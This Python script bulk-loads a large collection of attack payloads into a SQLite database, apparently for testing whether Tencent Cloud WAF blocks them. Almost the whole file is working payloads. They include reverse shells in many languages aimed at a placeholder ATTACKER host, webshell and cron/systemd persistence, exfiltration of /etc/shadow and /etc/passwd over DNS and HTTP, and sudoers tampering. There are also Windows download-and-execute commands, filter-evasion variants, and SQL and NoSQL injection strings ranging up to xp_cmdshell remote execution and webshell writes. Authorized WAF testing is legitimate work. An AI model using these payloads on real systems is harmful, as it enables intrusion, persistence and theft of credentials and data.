# -*- coding: utf-8 -*-
"""
Bulk-import authorized WAF-testing attack payloads.

Scope: 腾讯云WAF 拦截效果测试（用户已声明获得授权）
- 命令注入：反弹 Shell / 持久化 / OOB / 权限提升准备 / Windows / 各类绕过
- SQL 注入：关键字/空格/引号/逻辑绕过、报错、时间盲注、OOB、堆叠、UNION 变体、文件读写、认证绕过、宽字节等
"""
import sqlite3, uuid, os, sys
from datetime import datetime

DB_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "waf_bypasser.db")
DB_PATH = os.path.abspath(DB_PATH)

NOW = datetime.utcnow().isoformat(timespec="seconds") + "Z"
SRC = "manual-waf-attack-import"
TARGET = "腾讯云WAF"
DELIVERY = "URL路径"

# Reusable text templates
USAGE_URL = "作为 URL 路径片段发送到目标 WAF 前的探测端点，观察 WAF 是否拦截；ATTACKER/4444 换成你自己的 OOB 主机与端口。"
INDICATOR = "被拦截：WAF 返回 403/405/自定义拦截页；未拦截：请求穿透到达源站（200/500 等业务响应）。"

# ============================================================
# COMMAND INJECTION — 实质性攻击 payload
# ============================================================
CMDI = [
    # ---------- 反弹 Shell ----------
    ("反弹Shell-Bash-TCP", "反弹Shell", "高级",
     ";bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"),
    ("反弹Shell-Bash-Base64", "反弹Shell", "高级",
     ";echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=|base64 -d|bash"),
    ("反弹Shell-Python3", "反弹Shell", "高级",
     ";python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"sh\")'"),
    ("反弹Shell-Perl", "反弹Shell", "高级",
     ";perl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"),
    ("反弹Shell-PHP", "反弹Shell", "高级",
     ";php -r '$s=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    ("反弹Shell-Ruby", "反弹Shell", "高级",
     ";ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"ATTACKER\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"),
    ("反弹Shell-Netcat-Mkfifo", "反弹Shell", "高级",
     ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f"),
    ("反弹Shell-Awk", "反弹Shell", "高级",
     ";awk 'BEGIN{s=\"/inet/tcp/0/ATTACKER/4444\";while(42){do{printf\"shell> \"|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\")close(s)}}' /dev/null"),
    ("反弹Shell-Socat-PTY", "反弹Shell", "高级",
     ";socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444"),
    ("反弹Shell-Lua", "反弹Shell", "高级",
     ";lua -e 'local s=require(\"socket\");local c=s.tcp();c:connect(\"ATTACKER\",4444);while true do local r=c:receive();local f=io.popen(r,\"r\");c:send(f:read(\"*a\"));end'"),

    # ---------- 持久化写入 ----------
    ("持久化-PHP一句话Webshell", "持久化写入", "高级",
     ";echo '<?php @eval($_POST[0]);?>' > /var/www/html/.cache.php"),
    ("持久化-JSP木马落地", "持久化写入", "高级",
     ";echo PGpzcDo=|base64 -d > /opt/tomcat/webapps/ROOT/x.jsp"),
    ("持久化-SSH授权公钥写入", "持久化写入", "高级",
     ";mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3Nza...KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"),
    ("持久化-Cron反弹计划任务", "持久化写入", "高级",
     ";(crontab -l 2>/dev/null;echo '* * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1')|crontab -"),
    ("持久化-Systemd服务植入", "持久化写入", "高级",
     ";echo -e '[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/upd.service && systemctl enable --now upd"),
    ("持久化-Bashrc后门", "持久化写入", "高级",
     ";echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1 &' >> ~/.bashrc"),
    ("持久化-LD_PRELOAD劫持", "持久化写入", "高级",
     ";echo /tmp/x.so > /etc/ld.so.preload"),
    ("持久化-Curl拉马落地", "持久化写入", "中等",
     ";curl -fsSL http://ATTACKER/s.sh -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s"),
    ("持久化-Wget拉马落地", "持久化写入", "中等",
     ";wget -qO /tmp/.s http://ATTACKER/s.sh && sh /tmp/.s"),

    # ---------- 带外数据传输 (OOB) ----------
    ("OOB-DNS外带whoami", "带外数据传输", "高级",
     ";nslookup `whoami`.oob.ATTACKER.tld"),
    ("OOB-DNS外带shadow", "带外数据传输", "高级",
     ";for l in $(cat /etc/shadow|base64 -w0|fold -w62);do nslookup $l.exf.ATTACKER.tld;done"),
    ("OOB-HTTP-POST外带文件", "带外数据传输", "高级",
     ";curl -X POST --data-binary @/etc/passwd http://ATTACKER/exf"),
    ("OOB-HTTP-GET外带命令结果", "带外数据传输", "高级",
     ";curl http://ATTACKER/`id|base64 -w0`"),
    ("OOB-Ping-DNS命令回带", "带外数据传输", "高级",
     ";ping -c1 `hostname|cut -c1-30`.p.ATTACKER.tld"),
    ("OOB-反引号嵌套base64回带", "带外数据传输", "高级",
     ";wget http://ATTACKER/`cat /etc/passwd|base64 -w0|head -c200`"),
    ("OOB-延时验证Sleep", "带外数据传输", "基础",
     ";sleep 8"),
    ("OOB-延时验证Ping", "带外数据传输", "基础",
     ";ping -c 8 127.0.0.1"),
    ("OOB-无回显Bash读取回带", "带外数据传输", "高级",
     ";curl --data-urlencode d@/etc/passwd http://ATTACKER/x"),

    # ---------- 权限提升准备 ----------
    ("提权侦察-SUID枚举外带", "权限提升", "高级",
     ";find / -perm -4000 -type f 2>/dev/null|curl -X POST --data-binary @- http://ATTACKER/suid"),
    ("提权侦察-Capabilities外带", "权限提升", "高级",
     ";getcap -r / 2>/dev/null|nc ATTACKER 4444"),
    ("提权侦察-Sudo权限外带", "权限提升", "高级",
     ";sudo -n -l 2>&1|curl -X POST --data-binary @- http://ATTACKER/sudo"),
    ("提权动作-写Shadow", "权限提升", "高级",
     ";echo 'r00t:$6$abc$xyz:19000:0:99999:7:::' >> /etc/shadow"),
    ("提权动作-写Sudoers", "权限提升", "高级",
     ";echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"),

    # ---------- Windows 命令执行 ----------
    ("Windows-Certutil下载执行", "Windows命令执行", "高级",
     "&certutil -urlcache -split -f http://ATTACKER/m.exe %TEMP%\\m.exe&%TEMP%\\m.exe"),
    ("Windows-Mshta远程HTA", "Windows命令执行", "高级",
     "&mshta http://ATTACKER/m.hta"),
    ("Windows-PowerShell无落地IEX", "Windows命令执行", "高级",
     "&powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/p.ps1')\""),
    ("Windows-Bitsadmin下载", "Windows命令执行", "高级",
     "&bitsadmin /transfer j http://ATTACKER/m.exe %TEMP%\\m.exe&%TEMP%\\m.exe"),
    ("Windows-Regsvr32白名单执行", "Windows命令执行", "高级",
     "&regsvr32 /s /n /u /i:http://ATTACKER/f.sct scrobj.dll"),

    # ---------- 关键字绕过 ----------
    ("绕过-IFS空格替代", "关键字绕过", "中等",
     ";cat${IFS}/etc/passwd"),
    ("绕过-IFS-Mask变体", "关键字绕过", "中等",
     ";cat${IFS%%??}/etc/passwd"),
    ("绕过-引号拆关键字", "关键字绕过", "中等",
     ";c\"a\"t /e't'c/pa''sswd"),
    ("绕过-反斜杠拆关键字", "关键字绕过", "中等",
     ";c\\at /e\\tc/pa\\sswd"),
    ("绕过-变量拼接", "关键字绕过", "中等",
     ";a=c;b=at;$a$b /etc/passwd"),
    ("绕过-位置参数拆", "关键字绕过", "中等",
     ";c$@at /etc/passwd"),
    ("绕过-通配符替代命令", "关键字绕过", "高级",
     ";/???/c?t /???/p?ss??"),
    ("绕过-Base64整包执行", "关键字绕过", "高级",
     ";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh"),
    ("绕过-Hex解码执行", "关键字绕过", "高级",
     ";`printf '\\x63\\x61\\x74 /etc/passwd'`"),
    ("绕过-命令替换重定向", "关键字绕过", "中等",
     ";$(cat</etc/passwd)"),
    ("绕过-Rev倒序执行", "关键字绕过", "高级",
     ";`echo dwssap/cte/ tac|rev`"),

    # ---------- 空格 / 分隔符绕过 ----------
    ("绕过-Tab替代空格", "空格绕过", "中等",
     ";cat\t/etc/passwd"),
    ("绕过-换行符注入", "空格绕过", "中等",
     "%0acat /etc/passwd"),
    ("绕过-CRLF注入分隔", "空格绕过", "中等",
     "%0d%0acat /etc/passwd"),
    ("绕过-括号消除空格", "空格绕过", "高级",
     ";{cat,/etc/passwd}"),
    ("绕过-重定向替空格", "空格绕过", "中等",
     ";cat</etc/passwd"),
    ("绕过-分号被禁用管道", "空格绕过", "中等",
     "|id"),
    ("绕过-分号被禁用双与", "空格绕过", "中等",
     "&&id"),
    ("绕过-分号被禁用双竖线", "空格绕过", "中等",
     "||id"),

    # ---------- 编码绕过 ----------
    ("编码-双重URL编码", "编码绕过", "高级",
     "%253Bcat%2520/etc/passwd"),
    ("编码-Unicode转义", "编码绕过", "高级",
     ";cat \\u002fetc\\u002fpasswd"),
    ("编码-八进制路径", "编码绕过", "高级",
     ";cat `printf '\\57etc\\57passwd'`"),
]

# ============================================================
# SQL INJECTION — 绕过 / 冷门 / 攻击 payload
# ============================================================
SQLI = [
    # ---------- 关键字绕过 ----------
    ("SQLi-内联注释拆UNION", "关键字绕过", "中等",
     "1 UNI/**/ON SEL/**/ECT 1,2,3-- -"),
    ("SQLi-MySQL版本注释", "关键字绕过", "高级",
     "1 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,database()-- -"),
    ("SQLi-括号消空格UNION", "关键字绕过", "高级",
     "1 UNION(SELECT(1),(2),(3))-- -"),
    ("SQLi-反引号包裹表名", "关键字绕过", "中等",
     "1 UNION SELECT `user`,`password`,3 FROM `mysql`.`user`-- -"),
    ("SQLi-科学计数法混淆", "关键字绕过", "高级",
     "1.e(0)UNION SELECT 1,2,database()-- -"),
    ("SQLi-嵌套注释绕关键字", "关键字绕过", "高级",
     "1/*!11440UnIoN*//*!11440SeLeCt*/1,concat_ws(0x3a,user,password),3 FROM users-- -"),

    # ---------- 空格绕过 ----------
    ("SQLi-Tab替代空格", "空格绕过", "中等",
     "1%09UNION%09SELECT%091,2,3-- -"),
    ("SQLi-换行替代空格", "空格绕过", "中等",
     "1%0aUNION%0aSELECT%0a1,2,3-- -"),
    ("SQLi-注释块替空格", "空格绕过", "中等",
     "1/**/UNION/**/SELECT/**/1,2,3-- -"),
    ("SQLi-加号替空格", "空格绕过", "基础",
     "1+UNION+SELECT+1,2,3-- -"),
    ("SQLi-LatinNBSP替空格", "空格绕过", "高级",
     "1%a0UNION%a0SELECT%a01,2,3-- -"),
    ("SQLi-括号完全消空格", "空格绕过", "高级",
     "(1)UNION(SELECT(user()),(2),(3))-- -"),

    # ---------- 引号绕过 ----------
    ("SQLi-十六进制替字符串", "引号绕过", "高级",
     "1 UNION SELECT 1,2,3 FROM users WHERE username=0x61646d696e-- -"),
    ("SQLi-CHAR函数拼字符串", "引号绕过", "高级",
     "1 UNION SELECT 1,2,3 FROM users WHERE username=CHAR(97,100,109,105,110)-- -"),
    ("SQLi-UnHex拼接", "引号绕过", "高级",
     "1 UNION SELECT LOAD_FILE(CONCAT('/etc/',UNHEX('706173737764')))-- -"),

    # ---------- 逻辑绕过（or 1=1 之外） ----------
    ("SQLi-Like替等号", "逻辑绕过", "中等",
     "admin' OR 2 LIKE 2-- -"),
    ("SQLi-Between范围", "逻辑绕过", "中等",
     "admin' OR 'a' BETWEEN 'a' AND 'z'-- -"),
    ("SQLi-In集合", "逻辑绕过", "中等",
     "admin' OR 'a' IN ('a')-- -"),
    ("SQLi-Elt函数", "逻辑绕过", "高级",
     "admin' OR ELT(1,1)-- -"),
    ("SQLi-If真值", "逻辑绕过", "高级",
     "admin' OR IF(1,1,0)-- -"),
    ("SQLi-Strcmp布尔", "逻辑绕过", "高级",
     "admin' OR STRCMP('a','a')=0-- -"),
    ("SQLi-CaseWhen布尔", "逻辑绕过", "高级",
     "admin' OR CASE WHEN 1=1 THEN 1 ELSE 0 END-- -"),
    ("SQLi-Row表达式", "逻辑绕过", "高级",
     "admin' OR ROW(1,1)=(SELECT 1,1)-- -"),
    ("SQLi-Xor技巧", "逻辑绕过", "高级",
     "admin' XOR 0-- -"),

    # ---------- 报错注入 ----------
    ("SQLi-ExtractValue报错", "报错注入", "高级",
     "1 AND ExtractValue(1,CONCAT(0x7e,(SELECT database())))-- -"),
    ("SQLi-UpdateXML报错", "报错注入", "高级",
     "1 AND UpdateXML(1,CONCAT(0x7e,(SELECT version())),1)-- -"),
    ("SQLi-Exp溢出报错", "报错注入", "高级",
     "1 AND exp(~(SELECT * FROM (SELECT user())a))-- -"),
    ("SQLi-Floor聚合报错", "报错注入", "高级",
     "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    ("SQLi-GTID子集报错", "报错注入", "高级",
     "1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)-- -"),
    ("SQLi-JsonKeys报错", "报错注入", "高级",
     "1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(user,0x3a,password) FROM users LIMIT 1) USING utf8)))-- -"),

    # ---------- 时间盲注 ----------
    ("SQLi-MySQL-Sleep条件", "时间盲注", "高级",
     "1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -"),
    ("SQLi-MySQL-Benchmark替代", "时间盲注", "高级",
     "1 AND IF(1=1,BENCHMARK(5000000,MD5('x')),0)-- -"),
    ("SQLi-MySQL-HeavyQuery", "时间盲注", "高级",
     "1 AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C)-- -"),
    ("SQLi-PostgreSQL-PgSleep", "时间盲注", "高级",
     "1;SELECT CASE WHEN(SUBSTR(current_user,1,1)='p')THEN pg_sleep(5)ELSE pg_sleep(0)END-- -"),
    ("SQLi-MSSQL-WaitFor", "时间盲注", "高级",
     "1;IF(SUBSTRING((SELECT SYSTEM_USER),1,1)='s')WAITFOR DELAY '0:0:5'-- -"),
    ("SQLi-Oracle-DBMSPipe", "时间盲注", "高级",
     "1 AND 1=(CASE WHEN(SUBSTR(user,1,1)='S')THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5)ELSE 0 END)-- -"),
    ("SQLi-SQLite-Randomblob", "时间盲注", "高级",
     "1 AND CASE WHEN(SUBSTR(sqlite_version(),1,1)='3')THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))ELSE 0 END-- -"),

    # ---------- 带外注入 (OOB) ----------
    ("SQLi-MySQL-UNC外带", "带外注入", "高级",
     "1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.exf.ATTACKER.tld\\\\a'))-- -"),
    ("SQLi-MSSQL-XpDirtreeDNS", "带外注入", "高级",
     "1;DECLARE @d varchar(1024);SELECT @d=(SELECT TOP 1 password FROM users);EXEC('master..xp_dirtree \"\\\\'+@d+'.exf.ATTACKER.tld\\a\"')-- -"),
    ("SQLi-Oracle-UtlHttp", "带外注入", "高级",
     "1 UNION SELECT UTL_HTTP.REQUEST('http://ATTACKER/'||(SELECT user FROM dual)) FROM dual-- -"),
    ("SQLi-Oracle-DBMSLdap", "带外注入", "高级",
     "1 UNION SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.ATTACKER.tld',80) FROM dual-- -"),
    ("SQLi-PostgreSQL-CopyProgram外带", "带外注入", "高级",
     "1;COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER/?d=$(whoami)'-- -"),

    # ---------- 堆叠 / RCE ----------
    ("SQLi-堆叠插入管理员", "堆叠注入", "高级",
     "1;INSERT INTO users(username,password,role) VALUES('bd','$1$xxx','admin')-- -"),
    ("SQLi-堆叠提权Update", "堆叠注入", "高级",
     "1;UPDATE users SET role='admin' WHERE username='guest'-- -"),
    ("SQLi-MSSQL-XpCmdShellRCE", "堆叠注入", "高级",
     "1;EXEC master..xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/p.ps1'')'-- -"),
    ("SQLi-MSSQL-开启XpCmdShell", "堆叠注入", "高级",
     "1;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -"),
    ("SQLi-MSSQL-OLE自动化RCE", "堆叠注入", "高级",
     "1;DECLARE @o INT;EXEC sp_oacreate 'wscript.shell',@o OUT;EXEC sp_oamethod @o,'run',NULL,'cmd /c whoami>C:\\Windows\\Temp\\r.txt'-- -"),

    # ---------- UNION 变体 ----------
    ("SQLi-无逗号UNION-Join", "UNION变体", "高级",
     "1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c-- -"),
    ("SQLi-JsonArrayAgg拖表", "UNION变体", "高级",
     "1 UNION SELECT 1,JSON_ARRAYAGG(CONCAT_WS(0x3a,user,password)),3 FROM users-- -"),
    ("SQLi-GroupConcat拖表", "UNION变体", "中等",
     "1 UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR 0x0a),3 FROM information_schema.tables-- -"),
    ("SQLi-无Info_Schema-MySQL8", "UNION变体", "高级",
     "1 UNION SELECT 1,table_name,3 FROM mysql.innodb_table_stats-- -"),
    ("SQLi-Sys视图替代", "UNION变体", "高级",
     "1 UNION SELECT 1,table_name,3 FROM sys.schema_auto_increment_columns-- -"),

    # ---------- 文件读写 / Webshell ----------
    ("SQLi-MySQL-LoadFile读Passwd", "文件读写", "高级",
     "1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"),
    ("SQLi-MySQL-IntoOutfile写Webshell", "文件读写", "高级",
     "1 UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php'-- -"),
    ("SQLi-MySQL-DumpFileUDF", "文件读写", "高级",
     "1 UNION SELECT 1,UNHEX('7f454c46...'),3 INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'-- -"),
    ("SQLi-PostgreSQL-CopyFrom读文件", "文件读写", "高级",
     "1;CREATE TABLE tmp_x(x text);COPY tmp_x FROM '/etc/passwd'-- -"),

    # ---------- 认证绕过 ----------
    ("SQLi-认证绕过-Like通配", "认证绕过", "基础",
     "admin' AND password LIKE '%'-- -"),
    ("SQLi-认证绕过-注释密码字段", "认证绕过", "基础",
     "admin'-- -"),
    ("SQLi-认证绕过-联合伪造用户", "认证绕过", "中等",
     "x' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'-- -"),
    ("SQLi-认证绕过-Null密码列", "认证绕过", "中等",
     "admin' AND 1=1 UNION SELECT 1,NULL-- -"),

    # ---------- 编码 / 宽字节 ----------
    ("SQLi-双重URL编码UNION", "编码绕过", "高级",
     "1%2520UNION%2520SELECT%25201,2,3-- -"),
    ("SQLi-Unicode等价", "编码绕过", "高级",
     "1%u0020UNION%u0020SELECT%u00201,2,3-- -"),
    ("SQLi-宽字节吃反斜杠", "编码绕过", "高级",
     "1%bf%27 OR 1=1-- -"),
    ("SQLi-全角引号绕过", "编码绕过", "高级",
     "admin%EF%BC%87 OR 1=1-- -"),

    # ---------- 冷门 / 组合 ----------
    ("SQLi-无空格无等号-Like拖库", "综合绕过", "高级",
     "1/**/UNION/**/SELECT(user())FROM(mysql.user)WHERE(user)LIKE(0x726F6F7425)-- -"),
    ("SQLi-嵌套子查询绕UNION禁用", "综合绕过", "高级",
     "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(user,0x3a,password) FROM users LIMIT 1)),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    ("SQLi-JSON数值注入", "综合绕过", "高级",
     "{\"id\":\"1 UNION SELECT 1,version(),3-- -\"}"),

    # ---------- NoSQL ----------
    ("NoSQLi-Mongo-Ne绕过", "NoSQL注入", "中等",
     "username[$ne]=&password[$ne]="),
    ("NoSQLi-Mongo-Regex枚举", "NoSQL注入", "高级",
     "username[$regex]=^adm&password[$regex]=.*"),
    ("NoSQLi-Mongo-Where时间盲", "NoSQL注入", "高级",
     "{\"username\":\"admin\",\"password\":{\"$where\":\"sleep(5000)||true\"}}"),
]


def rows(dataset, vuln):
    for name, category, difficulty, content in dataset:
        yield {
            "id": str(uuid.uuid4()),
            "name": f"腾讯云WAF · {name}",
            "vulnerability": vuln,
            "category": category,
            "delivery": DELIVERY,
            "target": TARGET,
            "difficulty": difficulty,
            "content": content,
            "created_at": NOW,
            "archived_from_candidate_id": None,
            "source_agent": SRC,
            "source_candidate_id": None,
            "iteration_metadata_json": None,
            "is_pool_snapshot": 0,
            "usage_method": USAGE_URL,
            "success_indicators": INDICATOR,
            "is_deleted": 0,
        }


def main():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    all_rows = list(rows(CMDI, "command-injection")) + list(rows(SQLI, "sql-injection"))
    print(f"Preparing to insert {len(all_rows)} rows")

    cols = ["id","name","vulnerability","category","delivery","target","difficulty",
            "content","created_at","archived_from_candidate_id","source_agent",
            "source_candidate_id","iteration_metadata_json","is_pool_snapshot",
            "usage_method","success_indicators","is_deleted"]
    placeholders = ",".join(["?"]*len(cols))
    sql = f"INSERT INTO payloads ({','.join(cols)}) VALUES ({placeholders})"

    cur.executemany(sql, [tuple(r[c] for c in cols) for r in all_rows])
    conn.commit()

    print("Inserted. Recount by vulnerability:")
    for row in cur.execute(
        "SELECT vulnerability, COUNT(*) FROM payloads WHERE is_deleted=0 GROUP BY vulnerability ORDER BY 2 DESC"
    ):
        print(f"  {row[0]:<24} {row[1]}")

    print("\nNew rows added under source_agent =", SRC)
    for row in cur.execute(
        "SELECT vulnerability, COUNT(*) FROM payloads WHERE source_agent=? GROUP BY vulnerability",
        (SRC,),
    ):
        print(f"  {row[0]:<24} {row[1]}")

    conn.close()


if __name__ == "__main__":
    main()
